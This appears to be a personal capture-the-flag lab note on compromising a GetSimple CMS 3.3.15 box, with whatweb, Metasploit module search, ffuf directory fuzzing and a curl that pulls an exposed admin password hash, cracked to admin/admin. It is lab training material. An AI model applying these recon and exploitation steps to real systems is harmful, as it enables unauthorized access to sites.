Port 80 appears to be running

CMS - GetSimple CMS 

version 3.3.15
http://10.129.6.57/data/cache/2a4c6447379fba09620ba05582eb61af.txt

Logs invalid logins!!
http://10.129.201.192/data/other/logs/failedlogins.log
s
sudo sh -c 'echo "10.129.201.192 gettingstarted.htb" >> /etc/hosts'

![[/2. Recon/Images/Pasted image 20241007141415]]


![[Pasted image 20241007141415.png]]

```
whatweb http://10.129.201.192
```

```
┌──(paige㉿PH-LT02)-[/home/paige]
└─PS> whatweb http://10.129.201.192                                                                                
http://10.129.201.192 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.201.192], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]    
```

![[Screenshot_2024-10-07_11_56_34.png]]

## Metasploit

```
       =[ metasploit v6.4.18-dev                          ]
+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search getsimple

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/getsimplecms_unauth_code_exec                                                                                                            
```

![[Pasted image 20241007144838.png]]

Which allows us to grab the first capture flag
![[Pasted image 20241007145121.png]]
## Fuzzing

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.129.201.192/FUZZ -t 100 -ic -c 
```
Output

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.192/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

data                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 20ms]
admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 18ms]
plugins                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 19ms]
theme                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 19ms]
backups                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 19ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 19ms]
:: Progress: [220546/220546] :: Job [1/1] :: 4065 req/sec :: Duration: [0:00:47] :: Errors: 0 ::

### Passwords

Tried the following credentials below to gain access to admin after determining the hash.

```
┌──(paige㉿PH-LT02)-[~]
└─$ curl -s  http://10.129.201.192/data/users/admin.xml.reset | xmllint --format - 
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <NAME/>
  <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
  <EMAIL>admin@gettingstarted.com</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE/>
  <LANG>en_US</LANG>
</item>```
```

http://gettingstarted.htb/admin

| username                 | password                                 |
| ------------------------ | ---------------------------------------- |
| admin                    | admin                                    |


